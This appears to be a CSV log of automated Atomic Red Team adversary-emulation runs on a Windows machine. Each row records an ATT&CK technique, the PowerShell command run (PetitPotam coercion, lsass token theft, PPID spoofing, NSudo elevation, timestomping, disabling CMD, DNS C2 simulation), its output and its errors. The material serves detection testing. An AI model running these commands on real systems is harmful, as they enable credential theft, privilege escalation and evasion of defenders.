265,Fixed,command-and-control,command-and-control :: Remote Access Software,command-and-control :: ['UltraVNC Execution'],command-and-control :: T1219,operation__atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__820a346b2b676b51338c1170b675f76b__SAVED_2024-03-08_043106,atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__820a346b2b676b51338c1170b675f76b,['820a346b2b676b51338c1170b675f76b'],1,0,0,[1],[''],"[""Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:1+ Start-Process $env:ProgramFiles\\'uvnc bvba\\UltraVnc\\vncviewer.exe'+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ""]",['1'],"[""Start-Process $env:ProgramFiles\\'uvnc bvba\\UltraVnc\\vncviewer.exe'""]","['An adversary may attempt to trick the user into downloading UltraVNC for use as a C2 channel.\nUpon successful execution, UltraVNC will be executed.\n']",['UltraVNC Execution'],"[{'tactic': 'command-and-control', 'technique_name': 'Remote Access Software', 'technique_id': 'T1219'}]",['windows'],['psh']
311,Fixed,credential-access,credential-access :: Forced Authentication,credential-access :: ['PetitPotam'],credential-access :: T1187,operation__atomic_windows_depfalse_pshtrue__t1187__credential-access__forced_authentication__608b7021a5b8369e9fd858feba6f5611__SAVED_2024-03-07_222133,atomic_windows_depfalse_pshtrue__t1187__credential-access__forced_authentication__608b7021a5b8369e9fd858feba6f5611,['608b7021a5b8369e9fd858feba6f5611'],1,0,1,[1],['End of PetitPotam attack'],"['& : The module \'PathToAtomicsFolder\' could not be loaded. For more information, run \'Import-Module PathToAtomicsFolder\'.At line:1 char:3+ & ""PathToAtomicsFolder\\..\\ExternalPayloads\\PetitPotam.exe"" 10.0.0.3 1 ...+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PathToAtomicsFo...\\PetitPotam.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CouldNotAutoLoadModule ']",['0'],"['& ""PathToAtomicsFolder\\..\\ExternalPayloads\\PetitPotam.exe"" 10.0.0.3 10.0.0.2 1; Write-Host ""End of PetitPotam attack""']",['This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.\n'],['PetitPotam'],"[{'tactic': 'credential-access', 'technique_name': 'Forced Authentication', 'technique_id': 'T1187'}]",['windows'],['psh']
322,Fixed,multiple,multiple :: Access Token Manipulation: Parent PID Spoofing,multiple :: ['Parent PID Spoofing using PowerShell'],multiple :: T1134.004,operation__atomic_windows_depfalse_pshtrue__t1134_004__multiple__access_token_manipulation-_parent_pid_spoofing__a515bb54fd6e14b78297814875f3c73b__SAVED_2024-03-07_211239,atomic_windows_depfalse_pshtrue__t1134_004__multiple__access_token_manipulation-_parent_pid_spoofing__a515bb54fd6e14b78297814875f3c73b,['a515bb54fd6e14b78297814875f3c73b'],1,0,0,[1],[''],"['. : The term \'\\T1134.004\\src\\PPID-Spoof.ps1\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:3+ . ""$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1""; $ppid=Get-Proc ...+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (\\T1134.004\\src\\PPID-Spoof.ps1:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException PPID-Spoof : The term \'PPID-Spoof\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:104+ ... ""; $ppid=Get-Process explorer | select -expand id; PPID-Spoof -ppid $ ...+                                                        ~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PPID-Spoof:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']",['1'],"['. ""$PathToAtomicsFolder\\T1134.004\\src\\PPID-Spoof.ps1""; $ppid=Get-Process explorer | select -expand id; PPID-Spoof -ppid $ppid -spawnto ""C:\\Program Files\\Internet Explorer\\iexplore.exe"" -dllpath ""8b38ee_calc.dll""']","['This test uses PowerShell to replicates how Cobalt Strike does ppid spoofing and masquerade a spawned process.\nUpon execution, ""Process C:\\Program Files\\Internet Explorer\\iexplore.exe is spawned with pid ####"" will be displayed and\ncalc.exe will be launched.\n\nCredit to In Ming Loh (https://github.com/countercept/ppid-spoofing/blob/master/PPID-Spoof.ps1)\n']",['Parent PID Spoofing using PowerShell'],"[{'tactic': 'multiple', 'technique_name': 'Access Token Manipulation: Parent PID Spoofing', 'technique_id': 'T1134.004'}]",['windows'],['psh']
326,Fixed,multiple,multiple :: Create Process with Token,multiple :: ['Access Token Manipulation'],multiple :: T1134.002,operation__atomic_windows_depfalse_pshtrue__t1134_002__multiple__create_process_with_token__163fd8a878476002c604d0fe4e32a419__SAVED_2024-03-07_204510,atomic_windows_depfalse_pshtrue__t1134_002__multiple__create_process_with_token__163fd8a878476002c604d0fe4e32a419,['163fd8a878476002c604d0fe4e32a419'],1,0,0,[1],['ProcessName               Id Owner          -----------               -- -----          ApplicationFrameHost    6560 puma-4         cmd                      760 puma-4         cmd                     7744 puma-4         conhost                 3592 puma-4         conhost                 8064 puma-4         conhost                 8296 puma-4         csrss                    444 SYSTEM         csrss                    532 SYSTEM         ctfmon                  4136 puma-4         dasHost                 3088 LOCAL SERVICE  dllhost                 7252 puma-4         dllhost                 8620 puma-4         dwm                     1016 DWM-1          explorer                4700 puma-4         fontdrvhost              780 UMFD-0         fontdrvhost              792 UMFD-1         GameBar                 8144 puma-4         GameBarFTServer         4068 puma-4         Idle                       0                java                    7408 puma-4         lsass                    676 SYSTEM         Memory Compression      1768 SYSTEM         MicrosoftEdgeUpdate     3328 SYSTEM         MoUsoCoreWorker           64 SYSTEM         MsMpEng                 3080 SYSTEM         PhoneExperienceHost     8812 puma-4         powershell              8020 puma-4         python3.10              6640 puma-4         pythonw                 1888 puma-4         Registry                  92 SYSTEM         RuntimeBroker           5444 puma-4         RuntimeBroker           5708 puma-4         RuntimeBroker           5788 puma-4         RuntimeBroker           6396 puma-4         RuntimeBroker           7800 puma-4         SearchApp               5952 puma-4         SearchFilterHost        6856 SYSTEM         SearchIndexer           2720 SYSTEM         SearchProtocolHost      4660 SYSTEM         SecurityHealthService   7508 SYSTEM         SecurityHealthSystray   7480 puma-4         services                 640 SYSTEM         SgrmBroker              8880 SYSTEM         ShellExperienceHost     7984 puma-4         sihost                  3652 puma-4         SilkService             4816 SYSTEM         smartscreen             7428 puma-4         smss                     340 SYSTEM         splunkd                  820 puma-4         spoolsv                 2332 SYSTEM         sshd                    2624 SYSTEM         StartMenuExperienceHost 5568 puma-4         svchost                  324 LOCAL SERVICE  svchost                  396 SYSTEM         svchost                  400 SYSTEM         svchost                  592 LOCAL SERVICE  svchost                  772 SYSTEM         svchost                  888 NETWORK SERVICEsvchost                  932 SYSTEM         svchost                 1048 LOCAL SERVICE  svchost                 1056 SYSTEM         svchost                 1068 LOCAL SERVICE  svchost                 1236 SYSTEM         svchost                 1252 LOCAL SERVICE  svchost                 1264 LOCAL SERVICE  svchost                 1352 SYSTEM         svchost                 1360 LOCAL SERVICE  svchost                 1448 SYSTEM         svchost                 1456 LOCAL SERVICE  svchost                 1532 SYSTEM         svchost                 1580 NETWORK SERVICEsvchost                 1684 LOCAL SERVICE  svchost                 1704 SYSTEM         svchost                 1720 SYSTEM         svchost                 1804 SYSTEM         svchost                 1828 SYSTEM         svchost                 1840 LOCAL SERVICE  svchost                 1868 LOCAL SERVICE  svchost                 1988 LOCAL SERVICE  svchost                 2008 LOCAL SERVICE  svchost                 2016 LOCAL SERVICE  svchost                 2060 SYSTEM         svchost                 2072 NETWORK SERVICEsvchost                 2092 LOCAL SERVICE  svchost                 2108 LOCAL SERVICE  svchost                 2184 SYSTEM         svchost                 2380 LOCAL SERVICE  svchost                 2388 NETWORK SERVICEsvchost                 2400 SYSTEM         svchost                 2456 SYSTEM         svchost                 2516 NETWORK SERVICEsvchost                 2596 SYSTEM         svchost                 2848 SYSTEM         svchost                 2852 SYSTEM         svchost                 2884 NETWORK SERVICEsvchost                 2908 SYSTEM         svchost                 2920 NETWORK SERVICEsvchost                 2948 SYSTEM         svchost                 2960 LOCAL SERVICE  svchost                 3004 SYSTEM         svchost                 3040 LOCAL SERVICE  svchost                 3112 SYSTEM         svchost                 3220 SYSTEM         svchost                 3264 puma-4         svchost                 3272 LOCAL SERVICE  svchost                 3448 SYSTEM         svchost                 3480 SYSTEM         svchost                 3736 puma-4         svchost                 3744 SYSTEM         svchost                 3816 LOCAL SERVICE  svchost                 3828 puma-4         svchost                 4048 SYSTEM         svchost                 4232 SYSTEM         svchost                 4324 SYSTEM         svchost                 4848 LOCAL SERVICE  svchost                 5032 LOCAL SERVICE  svchost                 5076 SYSTEM         svchost                 5196 SYSTEM         svchost                 5780 SYSTEM         svchost                 5860 LOCAL SERVICE  svchost                 6160 SYSTEM         svchost                 6632 puma-4         svchost                 6748 LOCAL SERVICE  svchost                 6892 SYSTEM         svchost                 6920 SYSTEM         svchost                 7000 LOCAL SERVICE  svchost                 7548 SYSTEM         svchost                 7856 SYSTEM         svchost                 8056 puma-4         svchost                 9148 LOCAL SERVICE  System                     4                taskhostw               3980 puma-4         taskhostw               4004 puma-4         TextInputHost            388 puma-4         TiWorker                1608 SYSTEM         TrustedInstaller        6424 SYSTEM         uhssvc                  6168 SYSTEM         wininit                  520 SYSTEM         winlogon                 616 SYSTEM         WmiPrvSE                3056 SYSTEM         WmiPrvSE                7680 NETWORK SERVICE'],"['& : The term \'\\T1134.002\\src\\GetToken.ps1\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:213+ ... ing()]}}; & ""$PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1""; [MyPro ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (\\T1134.002\\src\\GetToken.ps1:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException Unable to find type [MyProcess].At line:1 char:264+ ... $PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1""; [MyProcess]::Create ...+                                                       ~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (MyProcess:TypeName) [], RuntimeException    + FullyQualifiedErrorId : TypeNotFound ']",['1'],"['Set-ExecutionPolicy -Scope Process Bypass -Force; $owners = @{}; gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; Get-Process | Select ProcessName,Id,@{l=""Owner"";e={$owners[$_.id.tostring()]}}; & ""$PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1""; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,""cmd.exe"")']",['This Action demonstrates how an access token for a specific program can spawn another program under a different owner. \nAdversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. \nThis Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe\n'],['Access Token Manipulation'],"[{'tactic': 'multiple', 'technique_name': 'Create Process with Token', 'technique_id': 'T1134.002'}]",['windows'],['psh']
329,Fixed,multiple,multiple :: Access Token Manipulation: Token Impersonation/Theft,multiple :: ['Launch NSudo Executable'],multiple :: T1134.001,"operation__atomic_windows_depfalse_pshtrue__t1134_001__multiple__access_token_manipulation-_token_impersonation,theft__81289b3d78d06c14b816f7644b1d9f8b__SAVED_2024-03-07_202435","atomic_windows_depfalse_pshtrue__t1134_001__multiple__access_token_manipulation-_token_impersonation,theft__81289b3d78d06c14b816f7644b1d9f8b",['81289b3d78d06c14b816f7644b1d9f8b'],1,1,1,[0],[''],"['Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:1+ Start-Process ""PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_ ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']",['0'],"['Start-Process ""PathToAtomicsFolder\\..\\ExternalPayloads\\NSudo_8.2_All_Components\\NSudo_Launcher\\x64\\NSudoLG.exe"" -Argument ""-U:T -P:E cmd""; Start-Sleep -Second 5; Stop-Process -Name ""cmd"" -force -erroraction silentlycontinue']",['Launches the NSudo executable for a short period of time and then exits.\nNSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.'],['Launch NSudo Executable'],"[{'tactic': 'multiple', 'technique_name': 'Access Token Manipulation: Token Impersonation/Theft', 'technique_id': 'T1134.001'}]",['windows'],['psh']
331,Fixed,multiple,multiple :: External Remote Services,multiple :: ['Running Chrome VPN Extensions via the Registry 2 vpn extension'],multiple :: T1133,operation__atomic_windows_depfalse_pshtrue__t1133__multiple__external_remote_services__ff4e1ea516f781a6ef93323ba9dfac0a__SAVED_2024-03-07_201047,atomic_windows_depfalse_pshtrue__t1133__multiple__external_remote_services__ff4e1ea516f781a6ef93323ba9dfac0a,['ff4e1ea516f781a6ef93323ba9dfac0a'],1,0,0,[1],['    Hive: HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Google\\Chrome\\ExtensionsName                           Property                                                                                ----                           --------                                                                                fcfhplploccackoneaefokcmbjfbke                                                                                         nj                                                                                                                     update_url   : https://clients2.google.com/service/update2/crxPSPath       : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\fcf               hplploccackoneaefokcmbjfbkenjPSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Google\\Chrome\\ExtensionsPSChildName  : fcfhplploccackoneaefokcmbjfbkenjPSDrive      : HKLMPSProvider   : Microsoft.PowerShell.Core\\Registryfdcgdnkidjaadafnichfpabhfomceb                                                                                         me                                                                                                                     update_url   : https://clients2.google.com/service/update2/crxPSPath       : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\fdc               gdnkidjaadafnichfpabhfomcebmePSParentPath : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Google\\Chrome\\ExtensionsPSChildName  : fdcgdnkidjaadafnichfpabhfomcebmePSDrive      : HKLMPSProvider   : Microsoft.PowerShell.Core\\Registry'],"['Start : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:406+ ... ice/update2/crx"" -PropertyType ""String"" -Force}; Start chrome; Start- ...+                                                      ~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand Stop-Process : Cannot find a process with the name ""chrome"". Verify the process name and call the cmdlet again.At line:1 char:445+ ... }; Start chrome; Start-Sleep -Seconds 30; Stop-Process -Name ""chrome""+                                               ~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (chrome:String) [Stop-Process], ProcessCommandException    + FullyQualifiedErrorId : NoProcessFoundForGivenName,Microsoft.PowerShell.Commands.StopProcessCommand ']",['1'],"['$extList = ""fcfhplploccackoneaefokcmbjfbkenj"", ""fdcgdnkidjaadafnichfpabhfomcebme""; foreach ($extension in $extList) {;   New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force;   New-ItemProperty -Path ""HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension"" -Name ""update_url"" -Value ""https://clients2.google.com/service/update2/crx"" -PropertyType ""String"" -Force}; Start chrome; Start-Sleep -Seconds 30; Stop-Process -Name ""chrome""']","['Running Chrome VPN Extensions via the Registry install 2 vpn extension, please see ""T1133\\src\\list of vpn extension.txt"" to view complete list\n']",['Running Chrome VPN Extensions via the Registry 2 vpn extension'],"[{'tactic': 'multiple', 'technique_name': 'External Remote Services', 'technique_id': 'T1133'}]",['windows'],['psh']
348,Fixed,defense-evasion,defense-evasion :: Modify Registry,defense-evasion :: ['Disable Windows CMD application'],defense-evasion :: T1112,operation__atomic_windows_depfalse_pshtrue__t1112__defense-evasion__modify_registry__86993ae14d75a6da421c0d98c3facd61__SAVED_2024-03-07_182754,atomic_windows_depfalse_pshtrue__t1112__defense-evasion__modify_registry__86993ae14d75a6da421c0d98c3facd61,['86993ae14d75a6da421c0d98c3facd61'],1,0,0,[1],[''],"['New-ItemProperty : Cannot find path \'HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\' because it does not exist.At line:1 char:1+ New-ItemProperty -Path ""HKCU:\\Software\\Policies\\Microsoft\\Windows\\Sys ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (HKCU:\\Software\\...\\Windows\\System:String) [New-ItemProperty], ItemNotFo    undException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.NewItemPropertyCommand ']",['1'],"['New-ItemProperty -Path ""HKCU:\\Software\\Policies\\Microsoft\\Windows\\System"" -Name DisableCMD -Value 1']",['Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows CMD application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n'],['Disable Windows CMD application'],"[{'tactic': 'defense-evasion', 'technique_name': 'Modify Registry', 'technique_id': 'T1112'}]",['windows'],['psh']
393,Fixed,discovery,discovery :: File and Directory Discovery,discovery :: ['Launch DirLister Executable'],discovery :: T1083,operation__atomic_windows_depfalse_pshtrue__t1083__discovery__file_and_directory_discovery__abc280f400f218aa1f4d5efe3c9e8228__SAVED_2024-03-07_125208,atomic_windows_depfalse_pshtrue__t1083__discovery__file_and_directory_discovery__abc280f400f218aa1f4d5efe3c9e8228,['abc280f400f218aa1f4d5efe3c9e8228'],1,0,0,[1],[''],"['Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:1+ Start-Process ""PathToAtomicsFolder\\..\\ExternalPayloads\\DirLister.exe"" ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand Stop-Process : Cannot find a process with the name ""DirLister"". Verify the process name and call the cmdlet again.At line:1 char:95+ ... DirLister.exe""; Start-Sleep -Second 4; Stop-Process -Name ""DirLister""+                                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (DirLister:String) [Stop-Process], ProcessCommandException    + FullyQualifiedErrorId : NoProcessFoundForGivenName,Microsoft.PowerShell.Commands.StopProcessCommand ']",['1'],"['Start-Process ""PathToAtomicsFolder\\..\\ExternalPayloads\\DirLister.exe""; Start-Sleep -Second 4; Stop-Process -Name ""DirLister""']",['Launches the DirLister executable for a short period of time and then exits.\n\nRecently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible directories and files.'],['Launch DirLister Executable'],"[{'tactic': 'discovery', 'technique_name': 'File and Directory Discovery', 'technique_id': 'T1083'}]",['windows'],['psh']
409,Fixed,command-and-control,command-and-control :: Application Layer Protocol: DNS,command-and-control :: ['DNS Long Domain Query'],command-and-control :: T1071.004,operation__atomic_windows_depfalse_pshtrue__t1071_004__command-and-control__application_layer_protocol-_dns__ce2eccff2f1de0096efa0da778a7e27c__SAVED_2024-03-07_092059,atomic_windows_depfalse_pshtrue__t1071_004__command-and-control__application_layer_protocol-_dns__ce2eccff2f1de0096efa0da778a7e27c,['ce2eccff2f1de0096efa0da778a7e27c'],1,0,0,[1],[''],"['Set-Location : Cannot find path \'C:\\Users\\puma-4\\Desktop\\PathToAtomicsFolder\' because it does not exist.At line:1 char:1+ Set-Location ""PathToAtomicsFolder""; .\\T1071.004\\src\\T1071-dns-domain- ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...ToAtomicsFolder:String) [Set-Location], ItemNotFoundE    xception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand .\\T1071.004\\src\\T1071-dns-domain-length.ps1 : The term \'.\\T1071.004\\src\\T1071-dns-domain-length.ps1\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:37+ ... ToAtomicsFolder""; .\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain ...+                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (.\\T1071.004\\src...main-length.ps1:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']",['1'],"['Set-Location ""PathToAtomicsFolder""; .\\T1071.004\\src\\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.nip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT']","['This test simulates an infected host returning data to a command and control server using long domain names.\nThe simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.\n Upon execution, DNS information about the domain will be displayed for each callout.\n']",['DNS Long Domain Query'],"[{'tactic': 'command-and-control', 'technique_name': 'Application Layer Protocol: DNS', 'technique_id': 'T1071.004'}]",['windows'],['psh']
417,Fixed,defense-evasion,defense-evasion :: Indicator Removal on Host: Timestomp,defense-evasion :: ['Windows - Modify file last modified timestamp with PowerShell'],defense-evasion :: T1070.006,operation__atomic_windows_depfalse_pshtrue__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__f1dcadde207fafe338ae3eb48805f23c__SAVED_2024-03-07_082530,atomic_windows_depfalse_pshtrue__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__f1dcadde207fafe338ae3eb48805f23c,['f1dcadde207fafe338ae3eb48805f23c'],1,0,0,[1],[''],"['Get-ChildItem : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\T1551.006_timestomp.txt\' because it does not exist.At line:1 char:1+ Get-ChildItem ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_time ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...6_timestomp.txt:String) [Get-ChildItem], ItemNotFound    Exception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand ']",['1'],"['Get-ChildItem ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt"" | % { $_.LastWriteTime = ""01/01/1970 00:00:00"" }']","['Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.\n']",['Windows - Modify file last modified timestamp with PowerShell'],"[{'tactic': 'defense-evasion', 'technique_name': 'Indicator Removal on Host: Timestomp', 'technique_id': 'T1070.006'}]",['windows'],['psh']
418,Fixed,defense-evasion,defense-evasion :: Indicator Removal on Host: Timestomp,defense-evasion :: ['Windows - Modify file last access timestamp with PowerShell'],defense-evasion :: T1070.006,operation__atomic_windows_depfalse_pshtrue__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__68ce066d07960123ccd981dd8c38a7c1__SAVED_2024-03-07_081852,atomic_windows_depfalse_pshtrue__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__68ce066d07960123ccd981dd8c38a7c1,['68ce066d07960123ccd981dd8c38a7c1'],1,0,0,[1],[''],"['Get-ChildItem : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\T1551.006_timestomp.txt\' because it does not exist.At line:1 char:1+ Get-ChildItem ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_time ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...6_timestomp.txt:String) [Get-ChildItem], ItemNotFound    Exception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand ']",['1'],"['Get-ChildItem ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt"" | % { $_.LastAccessTime = ""01/01/1970 00:00:00"" }']","['Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.\n']",['Windows - Modify file last access timestamp with PowerShell'],"[{'tactic': 'defense-evasion', 'technique_name': 'Indicator Removal on Host: Timestomp', 'technique_id': 'T1070.006'}]",['windows'],['psh']
419,Fixed,defense-evasion,defense-evasion :: Indicator Removal on Host: Timestomp,defense-evasion :: ['Windows - Timestomp a File'],defense-evasion :: T1070.006,operation__atomic_windows_depfalse_pshtrue__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__08a146a382df6fea9fa2275073e9d245__SAVED_2024-03-07_080535,atomic_windows_depfalse_pshtrue__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__08a146a382df6fea9fa2275073e9d245,['08a146a382df6fea9fa2275073e9d245'],1,0,0,[1],[''],"['import-module : The specified module \'PathToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1\' was not loaded because no valid module file was found in any module directory.At line:1 char:1+ import-module ""PathToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1"" ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ResourceUnavailable: (PathToAtomicsFo...s\\timestomp.ps1:String) [Import-Module], FileNot    FoundException    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand timestomp : The term \'timestomp\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:72+ ... ToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1""; timestomp -dest "" ...+                                                         ~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (timestomp:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']",['1'],"['import-module ""PathToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1""; timestomp -dest ""PathToAtomicsFolder\\..\\ExternalPayloads\\kxwn.lock""']",['Timestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n'],['Windows - Timestomp a File'],"[{'tactic': 'defense-evasion', 'technique_name': 'Indicator Removal on Host: Timestomp', 'technique_id': 'T1070.006'}]",['windows'],['psh']
420,Fixed,defense-evasion,defense-evasion :: Indicator Removal on Host: Timestomp,defense-evasion :: ['Windows - Modify file creation timestamp with PowerShell'],defense-evasion :: T1070.006,operation__atomic_windows_depfalse_pshtrue__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__1f2da2639fcd636ef1c7ead72de4469f__SAVED_2024-03-07_081213,atomic_windows_depfalse_pshtrue__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__1f2da2639fcd636ef1c7ead72de4469f,['1f2da2639fcd636ef1c7ead72de4469f'],1,0,0,[1],[''],"['Get-ChildItem : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\T1551.006_timestomp.txt\' because it does not exist.At line:1 char:1+ Get-ChildItem ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_time ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...6_timestomp.txt:String) [Get-ChildItem], ItemNotFound    Exception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand ']",['1'],"['Get-ChildItem ""PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt"" | % { $_.CreationTime = ""01/01/1970 00:00:00"" }']","['Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.\n']",['Windows - Modify file creation timestamp with PowerShell'],"[{'tactic': 'defense-evasion', 'technique_name': 'Indicator Removal on Host: Timestomp', 'technique_id': 